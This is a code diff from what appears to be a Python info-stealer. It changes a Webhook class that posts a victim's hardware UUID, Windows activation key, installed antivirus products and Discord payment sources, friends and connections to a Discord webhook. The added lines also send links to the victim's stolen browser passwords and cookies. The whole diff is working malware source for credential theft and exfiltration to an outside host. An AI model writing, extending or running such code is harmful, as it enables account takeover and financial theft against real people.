@@ -10,6 +10,8 @@ from target.steam import SteamAccount, SteamRemoteClient
 from checks.discord import DiscordUser, ConvertNitro, ConvertBadges
 from checks.roblox import RobloxUser
 
+from typing import List
+
 
 class Webhook:
     def __init__(self, webhook):
@@ -37,11 +39,8 @@ class Webhook:
         if r.status_code != 204:
             raise ConnectionError(r.json())
 
-    def DiscordAccountWebhook(self, discord: DiscordUser, hardware: Hardware):
+    def DiscordAccountWebhook(self, discord: DiscordUser, hardware: Hardware, links: List[str]):
         badges = ""
-        avs = ""
-        for av in hardware.AntiViruses:
-            avs += f"{av}\n"
 
         embed = Embed()
         embed.setTitle(":swan::hand_splayed:")
@@ -64,7 +63,10 @@ class Webhook:
         embed.addField("**UUID**", f"`{hardware.UUID}`", True)
         embed.addField("**Activation Key**", f"`{hardware.ActivationKey}`", True)
 
-        embed.addField("**AntiViruses**", f"```\n{avs}\n```", False)
+        embed.addField("**AntiViruses**", f"```\n" + '\n'.join(hardware.AntiViruses) + "\n```", False)
+
+        embed.addField("**Browsers Details**", f"```\nPasswords: {links[0]}\nCookies: {links[1]}\n```")
+
         embed.addField("**Payment Sources**", f"`{len(discord.paymentsrc)}`", True)
         embed.addField("**Friends**", f"`{len(discord.friends)}`", True)
         embed.addField("**Connections**", f"`{len(discord.conections)}`", True)
